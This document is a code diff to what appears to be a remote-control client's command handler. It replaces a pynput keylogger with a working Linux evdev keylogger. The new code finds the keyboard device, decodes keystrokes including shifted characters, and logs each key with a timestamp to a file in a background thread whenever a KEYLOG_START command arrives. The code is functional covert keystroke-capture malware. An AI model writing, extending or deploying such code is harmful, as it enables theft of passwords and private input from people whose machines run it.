@@ -480,25 +480,98 @@ class Client:
 
         elif command_type == CommandType.KEYLOG_START:
             log_file = "./keylogger.txt"
-            def run_keylogger():
-                def on_press(key):
-                    try:
-                        # Record alphanumeric keys
-                        with open(log_file, "a") as f:
-                            f.write(f"{key.char}")
-                    except AttributeError:
-                        # Record special keys (space, enter, etc.)
-                        with open(log_file, "a") as f:
-                            if key == key.space:
-                                f.write(" ")
-                            elif key == key.enter:
-                                f.write("\n")
-                            else:
-                                f.write(f" {str(key)} ")
 
-                # Set up the listener
-                with keyboard.Listener(on_press=on_press) as listener:
-                    listener.join()
+            def run_keylogger():
+                import evdev
+                import select
+                from evdev import ecodes
+                from datetime import datetime
+
+                devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
+                keyboard_dev = None
+                for dev in devices:
+                    caps = dev.capabilities()
+                    if ecodes.EV_KEY in caps:
+                        keyboard_dev = dev
+                        break
+
+                if keyboard_dev is None:
+                    print("[!] Keylogger: no keyboard device found")
+                    return
+
+                print(f"[*] Keylogger using device: {keyboard_dev.name} ({keyboard_dev.path})")
+
+                KEYMAP = {
+                    ecodes.KEY_A: ('a', 'A'), ecodes.KEY_B: ('b', 'B'),
+                    ecodes.KEY_C: ('c', 'C'), ecodes.KEY_D: ('d', 'D'),
+                    ecodes.KEY_E: ('e', 'E'), ecodes.KEY_F: ('f', 'F'),
+                    ecodes.KEY_G: ('g', 'G'), ecodes.KEY_H: ('h', 'H'),
+                    ecodes.KEY_I: ('i', 'I'), ecodes.KEY_J: ('j', 'J'),
+                    ecodes.KEY_K: ('k', 'K'), ecodes.KEY_L: ('l', 'L'),
+                    ecodes.KEY_M: ('m', 'M'), ecodes.KEY_N: ('n', 'N'),
+                    ecodes.KEY_O: ('o', 'O'), ecodes.KEY_P: ('p', 'P'),
+                    ecodes.KEY_Q: ('q', 'Q'), ecodes.KEY_R: ('r', 'R'),
+                    ecodes.KEY_S: ('s', 'S'), ecodes.KEY_T: ('t', 'T'),
+                    ecodes.KEY_U: ('u', 'U'), ecodes.KEY_V: ('v', 'V'),
+                    ecodes.KEY_W: ('w', 'W'), ecodes.KEY_X: ('x', 'X'),
+                    ecodes.KEY_Y: ('y', 'Y'), ecodes.KEY_Z: ('z', 'Z'),
+                    ecodes.KEY_0: ('0', ')'), ecodes.KEY_1: ('1', '!'),
+                    ecodes.KEY_2: ('2', '@'), ecodes.KEY_3: ('3', '#'),
+                    ecodes.KEY_4: ('4', '$'), ecodes.KEY_5: ('5', '%'),
+                    ecodes.KEY_6: ('6', '^'), ecodes.KEY_7: ('7', '&'),
+                    ecodes.KEY_8: ('8', '*'), ecodes.KEY_9: ('9', '('),
+                    ecodes.KEY_SPACE:     (' ',   ' '),
+                    ecodes.KEY_ENTER:     ('[ENTER]', '[ENTER]'),
+                    ecodes.KEY_TAB:       ('[TAB]',   '[TAB]'),
+                    ecodes.KEY_BACKSPACE: ('[BS]',    '[BS]'),
+                    ecodes.KEY_MINUS:     ('-', '_'),
+                    ecodes.KEY_EQUAL:     ('=', '+'),
+                    ecodes.KEY_LEFTBRACE: ('[', '{'),
+                    ecodes.KEY_RIGHTBRACE:(']', '}'),
+                    ecodes.KEY_SEMICOLON: (';', ':'),
+                    ecodes.KEY_APOSTROPHE:("'", '"'),
+                    ecodes.KEY_GRAVE:     ('`', '~'),
+                    ecodes.KEY_BACKSLASH: ('\\', '|'),
+                    ecodes.KEY_COMMA:     (',', '<'),
+                    ecodes.KEY_DOT:       ('.', '>'),
+                    ecodes.KEY_SLASH:     ('/', '?'),
+                }
+                SHIFT_KEYS = {ecodes.KEY_LEFTSHIFT, ecodes.KEY_RIGHTSHIFT}
+                shift_held = False
+
+                try:
+                    with open(log_file, "a") as f:
+                        while not self._keylogger_stop.is_set():
+                            r, _, _ = select.select([keyboard_dev.fd], [], [], 0.2)
+                            if not r:
+                                continue
+                            for event in keyboard_dev.read():
+                                if event.type != ecodes.EV_KEY:
+                                    continue
+
+                                key_event = evdev.categorize(event)
+
+                                if key_event.scancode in SHIFT_KEYS:
+                                    shift_held = (key_event.keystate != key_event.key_up)
+                                    continue
+
+                                if key_event.keystate == key_event.key_up:
+                                    continue
+
+                                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+
+                                entry = KEYMAP.get(key_event.scancode)
+                                if entry:
+                                    key_str = entry[1] if shift_held else entry[0]
+                                else:
+                                    key_str = ecodes.KEY.get(key_event.scancode, f'KEY_{key_event.scancode}')
+                                    key_str = f'[{key_str}]'
+
+                                f.write(f"{ts}  {key_str}\n")
+                                f.flush()
+                except OSError as e:
+                    print(f"[!] Keylogger error: {e}")
+
             self._keylogger_stop.clear()
             self._keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
             self._keylogger_thread.start()
